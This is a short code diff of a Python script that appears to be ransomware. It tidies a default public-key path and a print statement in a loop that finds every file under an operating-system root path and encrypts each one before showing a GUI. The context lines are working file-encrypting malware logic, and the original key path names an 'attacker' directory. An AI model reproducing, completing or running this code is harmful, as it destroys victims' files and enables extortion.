@@ -11,7 +11,7 @@ if __name__ == "__main__":
     parser.add_argument(
         "--pub",
         dest="public_key_file",
-        default="attacker/public_key.pem",
+        default="./public_key.pem",
         help="the public key to encrypt the sym key with"
     )
     parser.add_argument(
@@ -51,7 +51,7 @@ if __name__ == "__main__":
         # find all files and encrypt them
         files = find_files(os_root_path)
         for file in files:
-            print(f"encrypted {file}")
+            print(f'encrypted {file}')
             encrypt_file(file, key)
 
     # show gui
